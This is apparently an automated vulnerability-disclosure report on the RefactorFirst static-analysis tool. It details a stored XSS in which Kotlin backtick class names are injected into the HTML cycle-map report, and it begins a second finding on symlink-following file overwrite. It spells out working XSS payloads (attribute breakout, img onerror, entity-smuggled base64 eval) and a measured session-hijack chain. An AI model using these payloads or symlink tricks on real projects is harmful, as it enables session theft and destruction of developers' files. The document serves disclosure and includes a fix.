  all — verified: the released 0.9.0 htmlReport goal on a payload fixture produces a payload-free 'has no Cycles or
  Disharmonies' report, and Java identifiers cannot carry quotes or angle brackets), so real-world exposure begins with
  the release shipping the Kotlin analysis (0.10.0) unless the sinks are fixed first

## Exploitability rationale

R:L — the attacker must author (or contribute a PR to) the analyzed repository and the victim must run RefactorFirst and
open/share the report; delivery is the cheapest of the audit's report-injection classes (plain source text; verified to
ride fork-PR checkouts where the clone's origin stays the base project; no .git internals, no transport constraints,
fires on every OS) but is not network-reachable. E:D — the sinks render on the default path of the PRIMARY documented
flow (Maven htmlReport goal, the README's primary command) and the CLI's default report type (-t HTML, verified), with
cycle analysis on by default and the cycle-map section rendering for any repository whose only class cycle is the
attacker's (a single .kt file with two mutually-referencing payload-named classes); two caveats recorded: the cycle-map
sinks exist only in the FULL HtmlReport (the simple report — the README's GitHub-Actions step-summary artifact — has no
cycle-map visuals, measured: 0 popup buttons / 0 const-dot blocks / 0 module scripts), and the unconditional Kotlin
analysis is unreleased (released 0.9.0/0.8.0/0.7.1 contain no Kotlin parsing; the released 0.9.0 htmlReport goal on a
payload fixture produces a payload-free report — measured), so real-world exposure materializes with the release that
ships it (0.10.0) unless fixed first. C:D — pure string propagation: rewrite-kotlin 8.90.4 strips only the backticks
from identifiers and its FQN builder performs no character validation (it rewrites '/'→'.' and inner
'.'→'$', drops '/'-bearing vertices, strips '?'), RefactorFirst registers the raw FQN as a graph vertex unchecked, and the report layer's sole transformation is '$
'→'_'; the payload fires deterministically every run, in every consumption mode that renders the full report. I:S — the
realistically achievable top impact is session hijack, not code execution (measured in the simulated business chain): on
an authenticated hosting origin (the standard Jenkins-HTML-Publisher / CI-artifact-viewer / mvn-site publishing pattern
for Maven HTML reports, and the project's own rawcdn.githack-hosted sample-report pattern) the payload executed at page
load with ZERO interaction (first beacon 61-75ms after goto, before domContentLoaded) as every viewer, read the
non-HttpOnly cookie, rode the HttpOnly session via a same-origin fetch and exfiltrated the origin's private data
including each viewer's session id (two viewers compromised; 4 authenticated /secrets requests per viewer in the server
log); on the documented local file:// flow the impact is bounded to attacker-controlled rendering in a trusted context
plus beacon egress (browsers block local-file reads, file:// has no cookie surface — measured); the
README's $GITHUB_STEP_SUMMARY flow does NOT carry this finding's XSS (its artifact is the simple report — no cycle-map sinks — and GitHub's user-content sanitizer strips every script/handler shape from the full report too — both measured). Payload constraints (backtick/newline grammar; '/', '.', '?', '$
' mangled, dropped or truncated by the rewrite-kotlin FQN path / getClassName split) bound payload style only —
arbitrary JavaScript is still deliverable via named-character-reference smuggling + base64 (measured: eval (atob
(&apos;…&apos;)) executes with entities decoded in the popup-button element bodies), and the full exfiltration chain
executed within them.

## Code anchors

| File                                                                                                        | Line | Function                  |
|-------------------------------------------------------------------------------------------------------------|-----:|---------------------------|
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/KotlinSourceFileGraphBuilder.java` |   73 | `buildGraph`              |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/visitor/KotlinDependencyVisitor.java`           |  111 | `visitCompilationUnit`    |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/GraphDependencyCollector.java`                  |  144 | `registerClassVertex`     |
| `../graph-algorithms/src/main/java/org/hjug/dsm/CircularReferenceChecker.java`                                 |   76 | `detectCycles`            |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CycleRanker.java`                                       |   85 | `identifyRankedCycles`    |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                  |  484 | `renderCycles`            |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                  |  798 | `renderSingleCycle`       |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        |  919 | `renderClassCycleVisuals` |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        |  512 | `generateGraphButtons`    |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        |  533 | `generateDotImage`        |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        | 1070 | `generate2DPopup`         |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        | 1077 | `generateForce3DPopup`    |
| `../report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java`                                        | 1084 | `generateHidePopup`       |

## Background

RefactorFirst (org.hjug.refactorfirst) is a developer/CI static-analysis tool that parses a Java/Kotlin repository with
OpenRewrite, builds class/package dependency graphs, detects cycles, and emits an interactive HTML report (the default
CLI output -t HTML, the Maven htmlReport goal, and the mvn site report). The HTML report's 'Cycle Map' section
visualizes the single highest-priority class cycle with DOT-graph and popup widgets: renderClassCycleVisuals
(HtmlReport.java:916) derives a display name for the cycle — the simple name of one class in the cycle — and passes it
to generateGraphButtons (which emits a <script> block declaring `const <name>_dot = <dot>`), generateDotImage
(a <div id="<name>"> plus a <script type="module"> that references the name as a JS identifier and inside JS string
literals), and generate2DPopup/generateForce3DPopup/generateHidePopup (popup <button>s whose onclick handlers embed the
name inside two single-quoted JS strings and one identifier, plus popup/container div ids). The name originates from
Kotlin source files of the analyzed repository: Kotlin analysis runs unconditionally, and Kotlin backtick identifiers
may contain any characters except backtick and newline — so whenever the analyzed repository is not fully trusted, the
cycle name is attacker-controlled free-form text.

## Description

The only transformation applied to the cycle name is getClassName (cycle.getCycleName ()).replace (
"$", "_") (HtmlReport.java:919) — package prefix stripped (no effect on payloads without '.'), '$' escaped for JS (no
effect on payloads without
'$'). Upstream, the name is a raw graph-vertex string: KotlinSourceFileGraphBuilder walks *.kt/*.kts unconditionally and parses each with rewrite-kotlin's KotlinParser (even partially on parse errors); rewrite-kotlin 8.90.4's KotlinTreeParserVisitor.createIdentifier strips exactly the leading/trailing backtick and stores the inner text verbatim as the identifier simple name, and its type-attribution path builds JavaType FQNs via KotlinTypeSignatureBuilder.convertClassIdToFqn, which only rewrites '.'→'$
' and '/'→'.' — quotes, angle brackets, slashes and spaces pass through verbatim (verified in the pinned dependency
sources; the codebase's own handling of Kotlin '<anonymous>' vertices proves arbitrary non-Java characters already
traverse this pipeline). KotlinDependencyVisitor.visitCompilationUnit registers the raw FQN as a class-graph vertex (no
identifier validation, unlike the Java visitor's un-attributed fallback), GraphDependencyCollector adds it unchecked,
and CircularReferenceChecker/CycleRanker turn one vertex of a detected cycle into RankedCycle.cycleName; renderCycles
renders only the first-ranked cycle (limit (1)), which the repo author trivially controls by making their payload cycle
the only one. All seven downstream positions then emit the name raw: (1) `const <X>_dot = <dot>` inside a <script> block
(generateGraphButtons); (2) <div id="<X>"> ; (3) parser.parse (<X>_dot); (4) document.getElementById ("<X>"); (5)
svgPanZoom ('#<X> svg') — (2)- (5) in generateDotImage, the JS ones inside a single <script type="module">; (6)
onclick="showPopup/createForceGraph ('popup-<X>', 'graph-container-<X>', <X>_dot )" on two visible <button>s; (7)
id="popup-<X>" / id="graph-container-<X>" on the popup divs. Two HTML-layer breakout families result for a Kotlin
backticked cycle-participant class name X: (A) X containing a double quote terminates the onclick/id attribute value
early, and the remainder of X is tokenized as new attributes — the first injected occurrence becomes a clean
onmouseover="alert (1)" on the popup buttons and the cycle-map div (later duplicate attributes are dropped by the HTML
duplicate-attribute rule, the first survives) — arbitrary JavaScript on hover; (B) a zero-interaction markup injection:
generate2DPopup/generateForce3DPopup also place X in the popup buttons' element body ("Show <X> 2D/3D Popup"), so an X
containing `<img src=y onerror=alert(...)>` becomes a live <img> that executes at page load with no interaction. Dynamic
verification (0.10.0-SNAPSHOT, rewrite-kotlin 8.90.4, see poc/) confirmed variant (A) exactly as claimed (real-browser
hover execution on both popup buttons and the always-visible 95%×70vh cycle-map div, duplicate-attribute first-wins
verified in the DOM) and confirmed the zero-interaction impact of (B) with the payload
`x<img src=y onerror=alert(document&period;domain)>` — alert (document.domain) fires at page load over file:// and over
a hosted http origin (dialog carries the origin). It also REFUTED the originally documented (B) mechanism for this
snapshot: an X containing '</script>' was claimed to terminate the generateGraphButtons script element at the HTML
layer, but such a name never reaches the report — rewrite-kotlin's attributed FQN construction rewrites every '/' to '.'
(and inner '.' to '$', wrapping the segment in backticks), so the payload class yields FQN `csa.` + backtick +
`x<.script><img src=y onerror=alert(document$domain)>` + backtick, whose last-dot-derived package contains a backtick
and can never be a declared Kotlin package; removeClassesNotInCodebase drops the vertex, no cycle forms, nothing renders
(verified end-to-end: zero payload occurrences, no Cycle Map section). Structurally, after '/'→'.' mangling,
getClassName ()'s last-'.' split can never leave a '/' in the rendered cycle name, so the script-element breakout is
unreachable via cycle names on this snapshot (the cycle-map script block remains breakable by '</script>' through the
git remote URL baked into the DOT vertices — that vector is BUG-R2-S2-A2-H2's scope). The pre-analysis's parse-blocking
argument was verified correct for the pure-JS positions: for quote- and markup-bearing payloads the cycle-map classic
script (const <X>_dot = ...) and module script (parser.parse (<X>_dot) / getElementById ("<X>") / svgPanZoom ('#<X>
svg')) are JS SyntaxErrors while every other inline block (including the class-map script, where the payload sits inside
a template-literal string) parses — and the onclick pure-JS variant is additionally execution-blocked because showPopup
receives garbage popupIds — yet neither property constrains the HTML tokenizer, which is where all confirmed breakouts
occur. There is no Content-Security-Policy in the generated report, the report loads all chart/graph libraries from
public CDNs (designed for online viewing), minifyHtml defaults to false, and analyzeCycles defaults to true on both CLI
and Maven — so the vulnerable section renders in the default configuration for any repository containing a crafted
Kotlin cycle.

## Attack

Attacker = author of a public repository or PR contributor; victim = a developer or CI pipeline that runs RefactorFirst
on the repository and anyone who views the generated report — the tool's documented workflow (delivery verified
end-to-end from the victim's side for both a direct clone and a fork-PR checkout of an OSS project). Steps: (1) attacker
commits the crafted .kt file (two payload-named classes referencing each other); (2) victim clones or checks out the PR
and runs a default analysis — CLI `refactorfirst -b .` (default -t HTML), the README's primary Maven command
`mvn org.hjug.refactorfirst.plugin:…:htmlReport`, or `mvn site` — producing target/site/refactor-first-report.html whose
Cycle Map section embeds the payload in the popup-button onclick attributes, the graph div id, the popup div ids, the
`const <cycleName>_dot` script block and the popup-button element bodies (19 payload occurrences in the measured fixture
report); (3) any viewer opens the report in a browser (its designed mode — all chart/graph libraries load from CDNs):
the zero-interaction variant's injected <img onerror> (live markup in the popup-button bodies) executes automatically at
page load with no interaction — measured in the impact assessment: first attacker beacon 61-75ms after page load, before
domContentLoaded — while the hover-gated variant A fires onmouseover on the popup buttons and the always-visible
cycle-map div. For hosted copies (CI artifact servers / Jenkins HTML Publisher / mvn-site deployments /
rawcdn-githack-style publishing — the project itself publishes a sample report this way) the payload is stored XSS
against every viewer of that origin: measured on a simulated authenticated hosting origin, two independent viewers were
each compromised at page load (cookie theft plus same-origin exfiltration of the origin's private data including their
HttpOnly session ids); for local file:// viewing the script still executes in the weaker file:// origin but with bounded
impact (no cookie surface, no same-origin data — measured). The report file is persistent, so the payload fires on every
future view. The README's $GITHUB_STEP_SUMMARY flow is NOT an execution surface for this finding: it produces the simple
report (no cycle-map visuals — measured) and GitHub's user-content sanitizer strips every script/handler shape even from
the full report (measured against the documented allowlist).

### Payload

A Kotlin source file in the analyzed repository declaring, in two different packages, two mutually-referencing classes
named with the same backticked payload identifier, so the two form a dependency cycle and either vertex can become the
cycle name. Variant A (attribute breakout, hover-gated): class `q" onmouseover="alert(1)" x="` with a mirror in a second
package. Zero-interaction variant (the impact-governing shape, measured end-to-end in the impact assessment): class
`x<img src=y onerror=…>` and a mirror — quote-free so it stays inert in every attribute-context sink and renders live
markup in the popup-button element bodies; arbitrary JavaScript is deliverable despite the pipeline's character
constraints by smuggling dots/slashes/colons/question-marks/quotes as named character references (&period; &sol; &colon;
&quest; &apos; &equals; — decoded by the HTML parser in element bodies and unquoted attribute values) and
base64-encoding the payload body (eval (atob (&apos;…&apos;)) — measured executing in Chromium). Payload identifiers
must avoid backtick/newline (Kotlin grammar), '.',
'$', '/' and '?' — rewrite-kotlin 8.90.4 rewrites '/'→'.' and inner '.'→'$', strips '?', and drops '/'-bearing vertices
entirely, and getClassName () strips everything up to the last '.'; the finding's originally documented
`x</script><img src=y onerror=alert(document.domain)>` shape violates these constraints (contains '/' and '.') and does
not survive the pipeline (dynamically verified) — the </script> script-element breakout must not be claimed through the
cycle-name path.

## Data flow

### Step 1 —

`codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/KotlinSourceFileGraphBuilder.java:67-101`

Source: unconditional walk of the analyzed repository for *.kt/*.kts, each parsed with rewrite-kotlin's KotlinParser
(partial trees visited even on parse errors). A Kotlin backticked class name may contain ", <, >, / and spaces (anything
but backtick/newline) — attacker (repo author) fully controls it.

### Step 2 —

`org/openrewrite/kotlin/internal/KotlinTreeParserVisitor.java:3826-3850 (pinned rewrite-kotlin 8.90.4 source) + org/openrewrite/kotlin/KotlinTypeSignatureBuilder.kt:712-728`

Identifier/FQN construction: createIdentifier strips only the leading/trailing backtick and stores the inner text
verbatim as the J.Identifier simple name; the attributed JavaType FQN is built via convertClassIdToFqn which only
rewrites '.'→'$' and '/'→'.'. Quotes, angle brackets and spaces pass into jcd.getSimpleName () and
type.getFullyQualifiedName () verbatim. Dynamically probed (production parser config, poc/probe-*.log): the quote
payload attributes to FQN cqa.q" onmouseover="alert (1)" x=" and the markup payload to
cza.x<img src=y onerror=alert(document&period;domain)> — both verbatim; a '/'-bearing name attributes to csa.
`x<.script><img src=y onerror=alert(document$domain)>` (backtick-wrapped), whose last-dot-derived package contains a
backtick and can never be a declared package, so the vertex is dropped in the next step — the '/'→'.' rewrite therefore
constrains cycle-name payloads to be slash-free.

### Step 3 —

`codebase-graph-builder/src/main/java/org/hjug/graphbuilder/visitor/KotlinDependencyVisitor.java:99-118 + GraphDependencyCollector.java:48-63,144-146`

Vertex registration: registerClassVertex (raw FQN) / addClassDependency (raw FQN, dep FQN) add the payload string to the
JGraphT class graph with no character validation (contrast: the Java visitor's un-attributed fallback
enforces [A-Za-z_$][A-Za-z0-9_$]*). Kotlin↔Kotlin edges proven by KotlinGraphBuilderTest; the vertex survives
finalizeDto's removeClassesNotInCodebase because its package is declared.

### Step 4 —

`graph-algorithms/src/main/java/org/hjug/dsm/CircularReferenceChecker.java:47-84 + cost-benefit-calculator/src/main/java/org/hjug/cbc/CycleRanker.java:60-107`

Cycle detection: getCycles keys each unique cycle by one of its vertices (2-vertex/2-edge cycles pass the vertexCount>
1 && edgeCount>1 gate); identifyRankedCycles copies that key into RankedCycle.cycleName. Naming BOTH cycle classes with
the payload (different packages) defeats the HashMap-order choice of key vertex; rawPriority=vertexSet.size () ordering
plus renderCycles' limit (1) renders the attacker's (only) cycle.

### Step 5 —

`report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:483-487,783-798 + report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:916-920`

renderCycles (limit 1) → renderSingleCycle → renderClassCycleVisuals, where the sole sanitization is getClassName (...)
.replace ("$","_") — inert for a payload without '.' and '$'. analyzeCycles defaults to true (CLI ReportCommand.java:
38-41, Maven RefactorFirstHtmlReport.java:29-30); renderClassCycleVisuals is implemented only in the default HtmlReport.

### Step 6 — `report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:1070-1082`

Sink (attribute context, primary): generate2DPopup/generateForce3DPopup emit onclick="showPopup ('popup-<X>',
'graph-container-<X>', <X>_dot )" on visible <button>s. A " in X closes the attribute value at the HTML tokenizer layer;
the following ' onmouseover=' becomes a first-occurrence attribute with a clean quoted value (later duplicates dropped
per the HTML duplicate-attribute rule) — the button gains onmouseover="alert (1)" and executes attacker JS on hover —
dynamically confirmed in Chromium: both popup buttons carry {onclick: "showPopup ('popup-q", onmouseover: "alert (1)",
x: "', 'graph-container-q"} and real mouse hovers fire alert (1).

### Step 7 — `report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:533-560,1084-1090`

Sink (attribute context, secondary): generateDotImage emits <div id="<X>"> (95%×70vh, always visible) and
generateHidePopup emits id="popup-<X>"/id="graph-container-<X>" — the same " breakout lands onmouseover on the cycle-map
div and popup divs. The module script in the same method (parser.parse (<X>_dot), document.getElementById ("<X>"),
svgPanZoom ('#<X> svg')) is SyntaxError-killed for quote payloads (parse-blocked), which is irrelevant to the attribute
breakout — dynamically confirmed: <div id="q" onmouseover="alert(1)" x="" style="width: 95%; height: 70vh; ..."> and the
popup divs render the clean breakout attributes and fire on hover/mouseover.

### Step 8 — `report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:512-521`

Sink (script-element context, zero-interaction): generateGraphButtons emits
`<script>\nconst <X>_dot = <dot>\n</script>`. An X containing '</script>' terminates the script ELEMENT at the HTML
layer (script-data state ends before JS parsing — the JS SyntaxError defense never engages), and the inline markup that
follows in X (e.g. <img src=y onerror=alert(1)>) is parsed as live elements in the body, executing at page load with no
user interaction. The same breakout was claimed to apply to the getElementById ("<X>") string inside the
generateDotImage module script. DYNAMIC RESULT (poc/): this script-element breakout is NOT reachable via the cycle name
on this snapshot — the '/'→'.' FQN rewrite both drops '/'-bearing vertices (see step 2) and guarantees, after
getClassName ()'s last-'.' split, that the rendered cycle name contains no '/' at all, so no '</script' sequence can
ever reach these script blocks through the cycle-name path (the same blocks remain breakable by a '</script>'-bearing
git remote URL — BUG-R2-S2-A2-H2's scope). The zero-interaction impact is instead delivered by the popup generators'
element-body position (step 6's button labels 'Show <X> 2D/3D Popup'): a slash-free payload
containing <img src=y onerror=alert(document&period;domain)> renders a live <img> in both popup buttons whose onerror
handler (decoded to alert (document.domain)) executes at page load with no interaction — dynamically confirmed. The
parse-blocking prediction for this step was confirmed: the const <X>_dot block and the module script are JS SyntaxErrors
for quote- and markup-bearing payloads.

### Step 9 —

`report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:391-404 + cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java:63-66`

Execution context: no Content-Security-Policy exists anywhere in the report; the head loads Google
Charts/sigma.js/3d-force-graph/vizdom from public CDNs (online viewing is the designed mode); minifyHtml defaults to
false; the report is written verbatim to disk and routinely committed, shared, or hosted on CI artifact servers /
project sites — stored XSS against every viewer of that origin (impact-assessment-measured: on a simulated authenticated
hosting origin, two viewers were each compromised at page load with zero interaction — non-HttpOnly cookie read,
HttpOnly session ridden via a same-origin fetch, origin-private data exfiltrated — while on file:// the impact is
bounded to beacon egress with no cookie surface and no same-origin data; the README's $GITHUB_STEP_SUMMARY flow is not
an execution surface for this finding: its artifact is the simple report, which has no cycle-map visuals, and GitHub's
user-content sanitizer strips every script/handler shape even from the full report). The zero-interaction payload needs
no CDN and no script element — it fires from a bare <img> in the popup-button element bodies with every external request
blocked (measured).

## Fix / patch notes

diff --git a/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java
b/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java ---
a/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java +++
b/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java @@ -916,7 +916,12 @@ public class HtmlReport
extends SimpleHtmlReport { public String renderClassCycleVisuals (RankedCycle cycle, String repoUrl, CodebaseGraphDTO
codebaseGraphDTO) { String dot = buildClassCycleDot (classGraph, cycle, repoUrl, codebaseGraphDTO);

-        String cycleName = getClassName(cycle.getCycleName()).replace("$", "_");

+        // The cycle name is interpolated below into JS identifier, JS string literal,
+        // HTML attribute value and DOM id positions. Kotlin backtick identifiers may
+        // contain quotes, angle brackets, slashes and spaces, which break out of HTML
+        // attribute values (" -> event-handler injection) and terminate <script>
+        // elements (</script> -> markup injection) in the generated report.
+        // Restrict the name to an identifier-safe charset; no-op for ordinary names.
+        String cycleName = getClassName(cycle.getCycleName())
+                .replace("$", "_")
+                .replaceAll("[^A-Za-z0-9_]", "");

         StringBuilder stringBuilder = new StringBuilder();

## References

- https://cwe.mitre.org/data/definitions/79.html
- https://html.spec.whatwg.org/multipage/parsing.html#attribute-name-state (duplicate attributes: first occurrence wins)
- https://html.spec.whatwg.org/multipage/parsing.html#script-data-state (script element terminated by </script before JS
  parsing)
- https://kotlinlang.org/spec/syntax-and-grammar.html (escaped identifiers admit any characters except backtick and
  newline)
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [high] Report module file-write sink (ReportWriter.writeReportToDisk) follows attacker-committed symlinks in the analyzed repository, turning report generation into arbitrary file overwrite/creation outside the repository with developer/CI privileges

- key: `BUG-R2-S2-A5-H3`
- disclosure: owner_only
- cwe: CWE-59
- file: `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`

# Report module file-write sink (ReportWriter.writeReportToDisk) follows attacker-committed symlinks in the analyzed repository, turning report generation into arbitrary file overwrite/creation outside the repository with developer/CI privileges

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A5-H3
- **CWE:** CWE-59
- **CVSS:** 8.1 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`)
- **EV priority:** P0
- **EV score:** 8
- **PoC status:** reproduced
- **EXP status:** confirmed
- **Affected versions:** confirmed at 0.10.0-SNAPSHOT (commit 65d3bef); the ReportWriter write path
  (File.exists/mkdirs + createNewFile + Files.newBufferedWriter with no link-safety and no containment check) is the
  report output mechanism of the released 0.x line as well (the README documents released 0.9.0 producing
  target/site/refactor-first-report.html); exact introduction commit not verified against release tags

## Exploitability rationale

R:L — the attacker must author (or contribute a PR to) the analyzed repository, and the victim must clone it and run any
report command — the tool's documented primary workflow ("run from the root of your project", CI jobs on cloned PRs, the
README's GitHub Actions flow). No credentials, network position, or local access needed; victim interaction is inherent
(same reachability grade as the sibling repo-attacker findings on sources A1/A2/A3). E:D — every entry point that
produces a report file funnels through the single sink (ReportWriter.writeReportToDisk) with default in-repo output
locations and fixed filenames: the CLI default -o . writes ./refactor-first-report.html (HTML is the default report
type; HtmlReport inherits SimpleHtmlReport's fixed output name), the Maven htmlReport/simpleHtmlReport goals write <
reporting.outputDirectory (default target/site)>/refactor-first-report.html, and jsonreport writes
refactor-first-data.json. No configuration enables link safety; the flows that dodge the primitive are bounded ones
(sharpened by the real-scenario assessment EXP-R6-E3, 89/89 checks): a same-reactor mvn clean on stock Maven 3.8.x
(clean-plugin 2.5)
removes committed links at BOTH the default target/site and any POM-redirected reporting outputDirectory (clean 2.5
deletes the reporting output directory too — demonstrated), so the README's clean-leading GHA flow is immune there — but
the escape exists with clean-plugin >= 3.x pinned (demonstrated: the redirected-location link survives clean 3.2.0 and
the write follows it out of the repo), and the README's headline command, direct goal invocations, and the CLI never
clean; archive delivery is bounded differently — tar and Info-ZIP unzip both materialize the committed link, but the
extracted tree has no .git and every HTML/JSON path, CLI included, crashes with NullPointerException (Git.open (null))
before the write — so clone/checkout (the documented primary flow, which always has .git)
is the exposed delivery class. C:D — deterministic primitive: a committed symlink (git tree mode 120000, force-addable
past target/ in .gitignore) is materialized by the standard clone/checkout, and every file API on the write path has
fixed documented semantics (File.exists = stat-follows; File.createNewFile = open (O_CREAT|O_EXCL) → EEXIST on any
symlink, no side effect; Files.newBufferedWriter defaults = CREATE|TRUNCATE_EXISTING|WRITE → open (O_WRONLY|O_CREAT|
O_TRUNC), follows links). No race, no heap layout, no probabilistic element. I:X — with the victim's (developer/CI)
privileges: arbitrary truncation and destruction of any existing victim-writable file (clobbered shell configs, sources,
keys → broken shells/builds/pipelines = I:H alone), arbitrary file creation in any existing victim-writable directory
(dangling-link variant), and — composed with the confirmed content-injection findings of the same tool (file
names/identifiers carrying newlines and arbitrary bytes rendered raw into the report body) — near-arbitrary written
bytes at the chosen path, i.e. host code execution via ~/.bashrc/.profile/authorized_keys-class targets. Both halves of
the composed chain are statically confirmed findings; its dynamic demonstration is deferred to exp-build. The standalone
halves are dynamically demonstrated end-to-end in quasi-business environments (EXP-R6-E3):
developer workstations (private SSH key destroyed and unparseable, git and maven bricked for every invocation,
deployment-credential settings.xml destroyed, login shells degraded by rc error storms), a persistent self-hosted runner
(cross-job git/maven outage plus operator SSH lockout — loopback sshd denies every key after authorized_keys is
overwritten in place at 0600), and a hosted-runner simulation on the literal /home/runner paths (note: GitHub Actions
step shells run bash --noprofile --norc -eo pipefail and never source rc files — demonstrated — so the hosted-ephemeral
profile reduces to within-job tool breakage, e.g. later git steps failing on a clobbered ~/.gitconfig, that self-heals
at VM teardown). Relative link targets (../../.gitconfig from a repo cloned under ~/projects/<repo>)
are username-independent at known clone depth (demonstrated); overwrite semantics are full truncation through the same
inode (1 MB victim file → exactly report size, zero original bytes remaining, mode/ownership preserved); created files
(dangling-link variant) are 0644 umask, non-executable; EACCES on non-writable targets is swallowed with exit 0.

## Code anchors

| File                                                                                          | Line | Function            |
|-----------------------------------------------------------------------------------------------|-----:|---------------------|
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                        |   15 | `writeReportToDisk` |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                        |   21 | `writeReportToDisk` |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                        |   26 | `writeReportToDisk` |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                        |   31 | `writeReportToDisk` |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                    |   84 | `execute`           |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                    |  113 | `execute`           |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                    |  950 | `getOutputName`     |
| `../report/src/main/java/org/hjug/refactorfirst/report/json/JsonReportExecutor.java`             |   22 | `execute`           |
| `../report/src/main/java/org/hjug/refactorfirst/report/json/JsonReportExecutor.java`             |   55 | `execute`           |
| `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`                                 |   73 | `ReportCommand`     |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java` |   71 | `execute`           |

## Background

RefactorFirst is a developer/CI-side static-analysis tool (Maven plugin goals
htmlReport/simpleHtmlReport/jsonreport/csvreport, a picocli CLI, and a stub Gradle plugin) that scores code disharmonies
(God Classes, cycles, etc.) of a Java/Kotlin codebase and writes HTML/JSON/CSV reports to disk. Its documented workflow
is to run it inside a cloned repository — including third-party repositories — from the repo root (CLI) or via the
plugin goals (the README states the report lands at target/site/refactor-first-report.html), and its README's CI flow
runs simpleHtmlReport in a GitHub Actions step. All report formats funnel through one file-write sink,
ReportWriter.writeReportToDisk, which creates the output directory, creates the output file and writes the full report
content using plain java.io/java.nio calls with no link-safety and no containment check. The security-relevant property:
whenever the analyzed repository is not fully trusted, its working tree is attacker-controlled state — git commits
symlinks as first-class tree entries (mode 120000, force-addable past a gitignored target/), and the standard
clone/checkout materializes them on Linux/macOS — so any file operation that follows links lets repository content
redirect the write out of the repository.

## Description

writeReportToDisk (reportOutputDirectory, filename, string) performs four filesystem operations, every one of which
resolves symlinks. (1) new File (reportOutputDirectory). exists () is stat ()-based and follows links: a committed
directory symlink (e.g. target/site → an existing directory elsewhere) passes the check, mkdirs () is skipped, and the
subsequent path join resolves inside the linked directory (mkdirs () on a link path merely returns false silently). (2)
The path is built by raw concatenation (reportOutputDirectory + File.separator + filename) with no canonicalization or
containment against the analyzed project. (3) reportFile.createNewFile () is implemented as open (path, O_CREAT|O_EXCL);
POSIX mandates EEXIST whenever the path names a symlink — even a dangling one — so on a symlinked path it returns false
with no exception and no side effect; it neither blocks nor enables the write. (4) Files.newBufferedWriter
(reportFile.toPath (), Charset.defaultCharset ()) with no options behaves as CREATE|TRUNCATE_EXISTING|WRITE, i.e. open
(O_WRONLY|O_CREAT|O_TRUNC), which follows the final symlink: a link to an existing regular file is truncated and the
full report is written through it (arbitrary overwrite); a dangling link whose parent directory exists gets its target
file created with the report content (arbitrary creation); a link to a directory fails with EISDIR, and even that
IOException is caught and only logged, after which the tool logs "Done! View the report at …". Nothing in the tool
removes or sanitizes working-tree links before writing: ReportWriter is the only production write sink (full sweep of
all modules; the Gradle plugin module is an empty stub), the git-reading component (GitLogReader) only walks logs/diffs,
and grep confirms no NOFOLLOW_LINKS/toRealPath/getCanonicalPath/isSymbolicLink anywhere in production code. The write
location is exactly predictable for the attacker: the CLI's -o/--output defaults to "." (ReportCommand.java:71-75) so
the documented run-from-repo-root produces <repo>/refactor-first-report.html, and the filename is fixed —
SimpleHtmlReport.getOutputName () returns "refactor-first-report" (HtmlReport extends SimpleHtmlReport without
overriding it, so both HTML variants share the name) and JsonReportExecutor uses the constant
"refactor-first-data.json"; the Maven goals write into the analyzed project's own <reporting><outputDirectory>
(default <basedir>/target/site — exactly the location the README advertises), with the basedir prefix stripped and the
remainder resolved against the JVM working directory. A malicious repository therefore commits a symlink at exactly that
fixed name (git add -f defeats a gitignored target/); git clone / git checkout / actions/checkout materialize it on
Linux/macOS, and the victim's default-flags report run then writes through it. The written content is the report
document, which embeds repo-derived strings (file names, class/cycle names, remote URLs) that are rendered without
escaping elsewhere in the same tool (confirmed findings BUG-R2-S2-A1-H1/H3/H4, A2-H1/H2/H5) — including newline bytes,
which Linux/macOS file names may carry — so the bytes deposited at the linked target are attacker-shaped, not merely
tool-generated HTML. Bounds established during verification (sharpened by the EXP-R6-E3 real-scenario assessment): the
CSV report type is not exposed (its filename embeds a victim-local minute-resolution timestamp, CsvReport.java:131-135,
so the exact name cannot be pre-placed); a dangling directory-symlink fails cleanly (ENOENT, nothing written); a
same-reactor mvn clean on stock Maven 3.8.x (clean-plugin 2.5) deletes the committed symlink at BOTH the default
target/site and any POM-redirected <reporting><outputDirectory> location — clean 2.5 also deletes the reporting output
